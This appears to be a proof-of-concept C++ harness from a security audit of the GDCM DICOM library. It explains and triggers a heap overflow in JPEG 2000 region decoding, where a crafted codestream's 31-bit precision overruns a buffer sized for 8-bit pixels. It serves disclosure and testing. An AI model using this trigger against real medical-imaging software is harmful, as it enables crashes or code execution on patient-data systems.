// Finding 4: the JPEG 2000 codestream's declared precision overrides the DICOM
// header's after the output buffer has already been sized from the header.
//
// JPEG2000Codec::DecodeByStreamsCommon sizes `raw` from the header's
// BitsAllocated (here 8, so 64*64*1*1 = 4096 bytes). The crafted codestream's
// SIZ marker declares comp->prec = 31 (Ssiz = 0x1E). That mismatch updates
// PixelFormat but never reallocates `raw`, so the comp->prec > 16 branch then
// writes a uint32_t per pixel into a buffer sized for one byte per pixel:
// 12288 bytes past a 4096-byte allocation.
//
// Related to CVE-2024-22373, whose fix validated dimensions but not precision.
//
// Reachable through ImageRegionReader::ReadIntoBuffer (region/ROI decode).
// Whether a network endpoint reaches this API depends on the integrating
// product. The plain ImageReader path sizes its output buffer after PixelFormat
// has already been corrected.

#include "gdcmImageRegionReader.h"
#include "gdcmBoxRegion.h"

#include <iostream>
#include <vector>

int main(int argc, char *argv[])
{
    if (argc < 2) {
        std::cerr << "Usage: " << argv[0] << " <crafted.dcm>" << std::endl;
        return 1;
    }

    const char *filename = argv[1];
    std::cout << "[*] Opening: " << filename << std::endl;

    gdcm::ImageRegionReader reader;
    reader.SetFileName(filename);

    if (!reader.ReadInformation()) {
        std::cerr << "[-] ReadInformation() failed" << std::endl;
        return 1;
    }
    std::cout << "[+] ReadInformation() succeeded" << std::endl;

    // Request the full 64x64 region declared by the DICOM header.
    gdcm::BoxRegion region;
    region.SetDomain(0, 63, 0, 63, 0, 0);
    reader.SetRegion(region);

    // Buffer sized for the DICOM header's claimed BitsAllocated=8 -- the
    // same size DecodeByStreamsCommon uses for `raw`. The crafted J2K's
    // comp->prec=31 makes the decoder write uint32_t per pixel, overflowing
    // both this buffer and GDCM's internal raw[] allocation.
    const size_t bufsize = 64 * 64 * 1;
    std::vector<char> buffer(bufsize, 0);

    std::cout << "[*] Calling ReadIntoBuffer() with " << bufsize << "-byte buffer..." << std::endl;

    // TRIGGER: calls DecodeByStreamsCommon(), which overflows raw[].
    bool ok = reader.ReadIntoBuffer(buffer.data(), bufsize);

    if (!ok) {
        std::cerr << "[-] ReadIntoBuffer() returned false (no crash)" << std::endl;
        return 1;
    }

    std::cout << "[-] ReadIntoBuffer() succeeded WITHOUT crash -- overflow not triggered" << std::endl;
    return 0;
}
